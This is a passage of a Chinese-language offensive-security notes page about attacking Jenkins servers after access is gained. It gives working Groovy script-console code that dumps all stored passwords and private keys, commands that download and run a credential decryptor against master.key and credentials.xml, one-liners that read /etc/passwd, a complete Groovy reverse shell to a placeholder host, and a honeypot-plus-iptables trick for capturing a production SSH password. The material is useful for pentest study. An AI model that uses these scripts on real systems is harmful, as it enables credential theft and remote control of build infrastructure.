attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">hudson.security.HudsonPrivateSecurityRealm</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">disableSignup</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">true</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">disableSignup</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">enableCaptcha</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">false</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">enableCaptcha</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">securityRealm</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x03-凭证">0x03 凭证<a href="#0x03-凭证" class="hash-link" aria-label="Direct link to 0x03 凭证" title="Direct link to 0x03 凭证">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="凭证文件">凭证文件<a href="#凭证文件" class="hash-link" aria-label="Direct link to 凭证文件" title="Direct link to 凭证文件">​</a></h3>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$JENKINS_HOME/credentials.xml 或 $JENKINS_HOME/config.xml 凭证文件</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$JENKINS_HOME/secrets/master.key  密钥</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$JENKINS_HOME/secrets/hudson.util.Secret   hash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JENKINS_HOME/jobs/{pp path}/config.xml 具体管道的配置文件</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="终端获取">终端获取<a href="#终端获取" class="hash-link" aria-label="Direct link to  终端获取" title="Direct link to 终端获取">​</a></h3>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Jenkins.instance,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    null,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">for (c in creds) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     println( ( c.properties.privateKeySource ? &quot;ID: &quot; + c.id + &quot;, UserName: &quot; + c.username + &quot;, Private Key: &quot; + c.getPrivateKey() : &quot;&quot;))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">for (c in creds) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     println( ( c.properties.password ? &quot;ID: &quot; + c.id + &quot;, UserName: &quot; + c.username + &quot;, Password: &quot; + c.password : &quot;&quot;))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img loading="lazy" alt="image-20240329114335646" src="/assets/images/image-20240329114335646-82f0b3f795f34dcbe92c366d50a14185.png" width="2176" height="1140" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="终端解密">终端解密<a href="#终端解密" class="hash-link" aria-label="Direct link to 终端解密" title="Direct link to 终端解密">​</a></h3>
<p>解密工具  <a href="https://github.com/hoto/jenkins-credentials-decryptor" target="_blank" rel="noopener noreferrer">https://github.com/hoto/jenkins-credentials-decryptor</a></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">curl -L &quot;https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_Linux_x86_64&quot; -o jenkins-credentials-decryptor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chmod +x jenkins-credentials-decryptor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./jenkins-credentials-decryptor -m $JENKINS_HOME/secrets/master.key -s $JENKINS_HOME/secrets/hudson.util.Secret -c $JENKINS_HOME/credentials.xml -o json</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img loading="lazy" alt="image-20240329114107242" src="/assets/images/image-20240329114107242-764b70affd011a6a5b87a3faf366c9b9.png" width="1926" height="1392" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="script-解密">Script 解密<a href="#script-解密" class="hash-link" aria-label="Direct link to Script 解密" title="Direct link to Script 解密">​</a></h3>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">println(hudson.util.Secret.decrypt(&quot;{AQ...}&quot;))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">println(hudson.util.Secret.fromString(&quot;{AQ...}&quot;).getPlainText())</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img loading="lazy" alt="image-20240329105908735" src="/assets/images/image-20240329105908735-eee535043817b3fef039a3b66697e65b.png" width="2350" height="1138" class="img_ev3q"></p>
<p><img loading="lazy" alt="image-20240329105953972" src="/assets/images/image-20240329105953972-e96abe5396883892a5c5ba3c1aea0e3b.png" width="2200" height="1432" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x04-script-groovy-执行-node-利用">0x04 Script Groovy 执行 (Node 利用)<a href="#0x04-script-groovy-执行-node-利用" class="hash-link" aria-label="Direct link to 0x04 Script Groovy 执行 (Node 利用)" title="Direct link to 0x04 Script Groovy 执行 (Node 利用)">​</a></h2>
<p><a href="http://localhost:8080/script" target="_blank" rel="noopener noreferrer">http://localhost:8080/script</a></p>
<p>就是 Groovy 执行的语法，提供几个常用</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="普通执行">普通执行<a href="#普通执行" class="hash-link" aria-label="Direct link to 普通执行" title="Direct link to 普通执行">​</a></h3>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">println &quot;cat /etc/passwd&quot;.execute().text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">println new ProcessBuilder(&#x27;sh&#x27;,&#x27;-c&#x27;,&#x27;ls&#x27;).redirectErrorStream(true).start().text</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">def proc = &quot;id&quot;.execute();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def os = new StringBuffer();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proc.waitForProcessOutput(os, System.err);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">println(os.toString());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def proc = [&#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;&#x27;&#x27;whoami&#x27;&#x27;&#x27;].execute();</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img loading="lazy" alt="image-20240328151726668" src="/assets/images/image-20240328151726668-e32d69dc8aaad12f4f84c58d10ae5594.png" width="1160" height="794" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="反弹-shell">反弹 shell<a href="#反弹-shell" class="hash-link" aria-label="Direct link to 反弹 shell" title="Direct link to 反弹 shell">​</a></h3>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">String host = &quot;ip&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int port = 1234;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String cmd = &quot;/bin/bash&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Socket s = new Socket(host, port);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OutputStream po = p.getOutputStream(), so = s.getOutputStream();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while (!s.isClosed()) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while (pi.available() &gt; 0) so.write(pi.read());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while (pe.available() &gt; 0) so.write(pe.read());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">while (si.available() &gt; 0) po.write(si.read());</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">so.flush();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">po.flush();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Thread.sleep(50);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p.exitValue();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">break;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">} catch (Exception e) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p.destroy();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">s.close();</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="文件-1">文件<a href="#文件-1" class="hash-link" aria-label="Direct link to 文件" title="Direct link to 文件">​</a></h3>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">读</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">new File(&#x27;/etc/passwd&#x27;).text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">写</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">new File(&#x27;/tmp/file.txt&#x27;).withWriter(&#x27;UTF-8&#x27;) { writer -&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    try {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        writer &lt;&lt; &#x27;hello world\n&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    } finally {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        writer.close()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>其他一些语法参考  <a href="https://github.com/samrocketman/jenkins-script-console-scripts" target="_blank" rel="noopener noreferrer">https://github.com/samrocketman/jenkins-script-console-scripts</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x05-新建-node-获取-ssh-密码-prod-利用">0x05 新建 Node 获取 ssh 密码 (prod 利用)<a href="#0x05-新建-node-获取-ssh-密码-prod-利用" class="hash-link" aria-label="Direct link to 0x05 新建 Node 获取 ssh 密码 (prod 利用)" title="Direct link to 0x05 新建 Node 获取 ssh 密码 (prod 利用)">​</a></h2>
<p>使用 <a href="https://github.com/cowrie/cowrie" target="_blank" rel="noopener noreferrer">cowrie</a> 蜜罐或任意 ssh 蜜罐</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker run -p 2222:2222 cowrie/cowrie</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>新建一个节点复制目标节点</p>
<p><img loading="lazy" alt="image-20240328152250208" src="/assets/images/image-20240328152250208-79ba20694a776a4a5baa5c88d97e30c2.png" width="1036" height="556" class="img_ev3q"></p>
<p>选择需要获取的凭证节点及蜜罐监听 ip</p>
<p><img loading="lazy" alt="image-20240328145632234" src="/assets/images/image-20240328145632234-1ac796483508d8a9da834a19d4d95b10.png" width="2116" height="934" class="img_ev3q"></p>
<p>监听得到 Prod 的 ssh 密码</p>
<p><img loading="lazy" alt="image-20240328141146680" src="/assets/images/image-20240328141146680-0ae4062a2a1b9e3cd61977987aa03d81.png" width="855" height="102" class="img_ev3q"></p>
<p>特殊情况需要 22 端口的设置下转发</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#设置端口转发</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -P FORWARD ACCEPT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A INPUT -p tcp --dport 2222 -j ACCEPT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#蜜罐使用完之后将转发的规则删除，要删干净。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -L INPUT --line-numbers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -D INPUT 7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -L -n --line-numbers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -D PREROUTING 2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x06-jenkins-cli">0x06 jenkins-cli<a href="#0x06-jenkins-cli" class="hash-link" aria-label="Direct link to 0x06 jenkins-cli" title="Direct link to 0x06 jenkins-cli">​</a></h2>
<p><a href="http://localhost:8080/jnlpJars/jenkins-cli.jar" target="_blank" rel="noopener noreferrer">http://localhost:8080/jnlpJars/jenkins-cli.jar</a></p>
<p>可以直接通过 jenkins-cli 来操作</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">java -jar jenkins-cli.jar -s http://127.0.0.1:8081/ -auth demo:demo reload-con</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">figuration</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x07-cicd-攻击">0x07 CICD 攻击<a href="#0x07-cicd-攻击" class="hash-link" aria-label="Direct link to 0x07 CICD 攻击" title="Direct link to 0x07 CICD 攻击">​</a></h2>
<p>见 cicd-goat WP。</p>
<p><strong>参考</strong></p>
<blockquote>
<p><a href="https://github.com/gquere/pwn_jenkins" target="_blank" rel="noopener noreferrer">https://github.com/gquere/pwn_jenkins</a></p>
</blockquote></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/docs/tags/dev-sec-ops">DevSecOps</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/docs/tags/jenkins">Jenkins</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/docs/tags/cve">CVE</a></li></ul></div></div><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/Whoopsunix/whoopsunix.github.io/docs/05-DevOpsAttack/Jenkins/Jenkins.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/DevOpsAttack/cicd-goat/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">通过 cicd-goat 靶场学习Top 10 CI/CD Security Risks</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#0x00-查看版本" class="table-of-contents__link toc-highlight">0x00 查看版本</a></li><li><a href="#0x01-关键信息" class="table-of-contents__link toc-highlight">0x01 关键信息</a><ul><li><a href="#文件" class="table-of-contents__link toc-highlight">文件</a></li><li><a href="#环境变量" class="table-of-contents__link toc-highlight">环境变量</a></li></ul></li><li><a href="#0x02-用户相关" class="table-of-contents__link toc-highlight">0x02 用户相关</a><ul><li><a href="#修改已有用户密码" class="table-of-contents__link toc-highlight">修改已有用户密码</a><ul><li><a href="#生效密码" class="table-of-contents__link toc-highlight">生效密码</a></li></ul></li><li><a href="#默认密码" class="table-of-contents__link toc-highlight">默认密码</a><ul><li><a href="#删除后重新生成" class="table-of-contents__link toc-highlight">删除后重新生成</a></li></ul></li></ul></li><li><a href="#0x03-凭证" class="table-of-contents__link toc-highlight">0x03 凭证</a><ul><li><a href="#凭证文件" class="table-of-contents__link toc-highlight">凭证文件</a></li><li><a href="#终端获取" class="table-of-contents__link toc-highlight">终端获取</a></li><li><a href="#终端解密" class="table-of-contents__link toc-highlight">终端解密</a></li><li><a href="#script-解密" class="table-of-contents__link toc-highlight">Script 解密</a></li></ul></li><li><a href="#0x04-script-groovy-执行-node-利用" class="table-of-contents__link toc-highlight">0x04 Script Groovy 执行 (Node 利用)</a><ul><li><a href="#普通执行" class="table-of-contents__link toc-highlight">普通执行</a></li><li><a href="#反弹-shell" class="table-of-contents__link toc-highlight">反弹 shell</a></li><li><a href="#文件-1" class="table-of-contents__link toc-highlight">文件</a></li></ul></li><li><a href="#0x05-新建-node-获取-ssh-密码-prod-利用" class="table-of-contents__link toc-highlight">0x05 新建 Node 获取 ssh 密码 (prod 利用)</a></li><li><a href="#0x06-jenkins-cli" 